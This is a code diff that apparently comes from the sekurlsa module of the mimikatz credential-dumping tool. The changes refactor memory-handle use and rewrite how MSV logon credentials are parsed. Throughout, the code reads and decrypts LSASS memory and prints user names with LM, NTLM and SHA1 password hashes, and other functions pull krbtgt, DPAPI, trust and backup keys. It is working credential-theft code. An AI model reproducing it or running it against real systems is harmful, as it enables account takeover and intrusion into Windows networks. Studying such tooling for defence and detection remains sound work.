@@ -259,8 +259,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 	KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
 	ULONG nbListes = 1, i;
 	PVOID pStruct;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &hLocalMemory}, aBuffer = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS securityStruct, data = {&nbListes, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	BOOL retCallback = TRUE;
 	const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
@@ -294,7 +293,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 		{
 			securityStruct.address = &LogonSessionList[i];
 			data.address = &pStruct;
-			data.hMemory = &hLocalMemory;
+			data.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
 			if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
 			{
 				if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
@@ -416,7 +415,7 @@ KULL_M_PATCH_GENERIC SecDataReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_W2K8_SecData),		PTRN_W2K8_SecData},		{0, NULL}, { 11, 39}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_W2K12_SecData),	PTRN_W2K12_SecData},	{0, NULL}, { 10, 39}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
+	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
 };
 #elif defined _M_IX86
 BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
@@ -431,8 +430,7 @@ NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
 	LONG l = 0;
 	DUAL_KRBTGT dualKrbtgt = {NULL, NULL};
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {&dualKrbtgt, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {&dualKrbtgt, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 
 	if(NT_SUCCESS(status))
 	{
@@ -459,8 +457,7 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 	DWORD sizeForCreds, i;
 	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
 	KIWI_KRBTGT_CREDENTIALS_5 tmpCred5, *creds5;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsass = {addr, cLsass.hLsassMem}, aLocal = {&tmpCred6, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsass = {addr, cLsass.hLsassMem}, aLocal = {&tmpCred6, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 
 	if(addr)
 	{
@@ -554,8 +551,7 @@ KULL_M_PATCH_GENERIC SysCredReferences[] = {
 NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 {
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, aLocal = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	PKUHL_M_SEKURLSA_PACKAGE pPackage = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8) ? &kuhl_m_sekurlsa_dpapi_svc_package : &kuhl_m_sekurlsa_dpapi_lsa_package;
 	PVOID pBool = NULL, pShaSystem = NULL, pShaUser = NULL;
 	BOOL fSystemCredsInitialized;
@@ -617,8 +613,7 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 	NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();
 	PVOID buffer;
 	KDC_DOMAIN_INFO domainInfo;
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, data = {&buffer, &hBuffer}, aBuffer = {&domainInfo, &hBuffer};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass.hLsassMem}, data = {&buffer, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {&domainInfo, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 
 	if(cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_7)
 	{
@@ -654,8 +649,7 @@ NTSTATUS kuhl_m_sekurlsa_trust(int argc, wchar_t * argv[])
 
 void kuhl_m_sekurlsa_trust_domainkeys(struct _KDC_DOMAIN_KEYS_INFO * keysInfo, PCWSTR prefix, BOOL incoming, PCUNICODE_STRING domain)
 {
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsass = {keysInfo->keys, cLsass.hLsassMem}, aData = {NULL, &hBuffer};
+	KULL_M_MEMORY_ADDRESS aLsass = {keysInfo->keys, cLsass.hLsassMem}, aData = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	DWORD i;
 	PKDC_DOMAIN_KEYS domainKeys;
 
@@ -718,8 +712,7 @@ void kuhl_m_sekurlsa_trust_domaininfo(struct _KDC_DOMAIN_INFO * info)
 
 void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, BOOL isExport)
 {
-	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass->hLsassMem}, aData = {NULL, &hBuffer};
+	KULL_M_MEMORY_ADDRESS aLsass = {NULL, cLsass->hLsassMem}, aData = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	GUID guid;
 	DWORD cb;
 	PVOID pGuid, pKeyLen, pKeyBuffer;
@@ -915,9 +908,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 
 VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
 {
-	PUNICODE_STRING credentials, username = NULL, domain = NULL, password = NULL;
-	PMSV1_0_PRIMARY_CREDENTIAL pPrimaryCreds;
-	PMSV1_0_PRIMARY_CREDENTIAL_10 pPrimaryCreds10;
+	PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
 	PRPCE_CREDENTIAL_KEYCREDENTIAL pRpceCredentialKeyCreds;
 	PKERB_HASHPASSWORD_GENERIC pHashPassword;
 	UNICODE_STRING buffer;
@@ -925,6 +916,8 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 	DWORD type, i;
 	BOOL isNull = FALSE;
 	PWSTR sid = NULL;
+	PBYTE msvCredentials;
+	const MSV1_0_PRIMARY_HELPER * pMSVHelper;
 	
 	if(mesCreds)
 	{
@@ -932,77 +925,49 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
 		{
 			type = flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL_MASK;
-			credentials = (PUNICODE_STRING) mesCreds;
-			if(credentials->Buffer)
+			if(msvCredentials = (PBYTE) ((PUNICODE_STRING) mesCreds)->Buffer)
 			{
 				if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
-					(*lsassLocalHelper->pLsaUnprotectMemory)(((PUNICODE_STRING) mesCreds)->Buffer, ((PUNICODE_STRING) mesCreds)->Length);
+					(*lsassLocalHelper->pLsaUnprotectMemory)(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length);
 
 				switch(type)
 				{
-				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
-					pPrimaryCreds = (PMSV1_0_PRIMARY_CREDENTIAL) credentials->Buffer;
-					kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->UserName, FALSE);
-					kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCreds, &pPrimaryCreds->LogonDomainName, FALSE);
-
-					kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds->UserName, &pPrimaryCreds->LogonDomainName);
-					if(pPrimaryCreds->isLmOwfPassword)
-					{
-						kprintf(L"\n\t * LM       : ");
-						kull_m_string_wprintf_hex(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					}
-					if(pPrimaryCreds->isNtOwfPassword)
-					{
-						kprintf(L"\n\t * NTLM     : ");
-						kull_m_string_wprintf_hex(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-					}
-					if(pPrimaryCreds->isShaOwPassword)
-					{
-						kprintf(L"\n\t * SHA1     : ");
-						kull_m_string_wprintf_hex(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
-					}
-					if(sid && (pPrimaryCreds->isNtOwfPassword || pPrimaryCreds->ShaOwPassword))
-						kuhl_m_dpapi_oe_credential_add(sid, NULL, pPrimaryCreds->isNtOwfPassword ? pPrimaryCreds->NtOwfPassword : NULL, pPrimaryCreds->isShaOwPassword ? pPrimaryCreds->ShaOwPassword : NULL, NULL, NULL);
-					break;
-				case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10:
-					pPrimaryCreds10 = (PMSV1_0_PRIMARY_CREDENTIAL_10) credentials->Buffer;
-					kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->UserName, FALSE);
-					kull_m_string_MakeRelativeOrAbsoluteString(pPrimaryCreds10, &pPrimaryCreds10->LogonDomainName, FALSE);
-
-					kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", &pPrimaryCreds10->UserName, &pPrimaryCreds10->LogonDomainName);
-					kprintf(L"\n\t * Flags    : I%02x/N%02x/L%02x/S%02x", pPrimaryCreds10->isIso, pPrimaryCreds10->isNtOwfPassword, pPrimaryCreds10->isLmOwfPassword, pPrimaryCreds10->isShaOwPassword);
-					if(!pPrimaryCreds10->isIso)
-					{
-						if(pPrimaryCreds10->isLmOwfPassword)
+					case KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY:
+						pMSVHelper = kuhl_m_sekurlsa_msv_helper(pData->cLsass);
+						kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain), FALSE);
+						kull_m_string_MakeRelativeOrAbsoluteString(msvCredentials, (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), FALSE);
+						kprintf(L"\n\t * Username : %wZ\n\t * Domain   : %wZ", (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToUserName), (PUNICODE_STRING) (msvCredentials + pMSVHelper->offsetToLogonDomain));
+						if(!pMSVHelper->offsetToisIso || !*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisIso))
 						{
-							kprintf(L"\n\t * LM       : ");
-							kull_m_string_wprintf_hex(pPrimaryCreds10->LmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisLmOwfPassword))
+							{
+								kprintf(L"\n\t * LM       : ");
+								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+							}
+							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword))
+							{
+								kprintf(L"\n\t * NTLM     : ");
+								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
+							}
+							if(*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword))
+							{
+								kprintf(L"\n\t * SHA1     : ");
+								kull_m_string_wprintf_hex(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH, 0);
+							}
+							if(sid && (*(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) || *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword)))
+								kuhl_m_dpapi_oe_credential_add(sid, NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisNtOwfPassword) ? msvCredentials + pMSVHelper->offsetToNtOwfPassword : NULL, *(PBOOLEAN) (msvCredentials + pMSVHelper->offsetToisShaOwPassword) ? msvCredentials + pMSVHelper->offsetToShaOwPassword : NULL, NULL, NULL);
 						}
-						if(pPrimaryCreds10->isNtOwfPassword)
-						{
-							kprintf(L"\n\t * NTLM     : ");
-							kull_m_string_wprintf_hex(pPrimaryCreds10->NtOwfPassword, LM_NTLM_HASH_LENGTH, 0);
-						}
-						if(pPrimaryCreds10->isShaOwPassword)
-						{
-							kprintf(L"\n\t * SHA1     : ");
-							kull_m_string_wprintf_hex(pPrimaryCreds10->ShaOwPassword, SHA_DIGEST_LENGTH, 0);
-						}
-						if(sid && (pPrimaryCreds10->isNtOwfPassword || pPrimaryCreds10->ShaOwPassword))
-							kuhl_m_dpapi_oe_credential_add(sid, NULL, pPrimaryCreds10->isNtOwfPassword ? pPrimaryCreds10->NtOwfPassword : NULL, pPrimaryCreds10->isShaOwPassword ? pPrimaryCreds10->ShaOwPassword : NULL, NULL, NULL);
-					}
-					else
-						kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) ((PBYTE) pPrimaryCreds10 + FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword) + sizeof(USHORT)));
-					break;
+						else kuhl_m_sekurlsa_genericLsaIsoOutput((PLSAISO_DATA_BLOB) (msvCredentials + pMSVHelper->offsetToIso + sizeof(USHORT)));
+						break;
 				case KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY:
-					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
+					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) msvCredentials;
 					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
 					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
 						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base, sid);
 					break;
 				default:
 					kprintf(L"\n\t * Raw data : ");
-					kull_m_string_wprintf_hex(credentials->Buffer, credentials->Length, 1);
+					kull_m_string_wprintf_hex(msvCredentials, ((PUNICODE_STRING) mesCreds)->Length, 1);
 				}
 			}
 		}
